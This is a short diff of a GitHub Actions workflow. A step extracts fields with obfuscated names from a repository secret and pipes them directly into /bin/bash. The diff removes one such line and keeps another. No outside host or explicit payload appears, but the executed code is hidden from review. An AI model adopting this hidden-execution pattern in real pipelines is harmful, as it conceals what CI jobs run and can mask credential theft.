@@ -21,7 +21,6 @@ jobs:
           kmi0888: ${{ secrets.kmi0888 }}
         run: |
           printf '%s' "$kmi0888" | jq -r .nmrmd6 | /bin/bash
-          echo $w849 | jq -r .z3 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
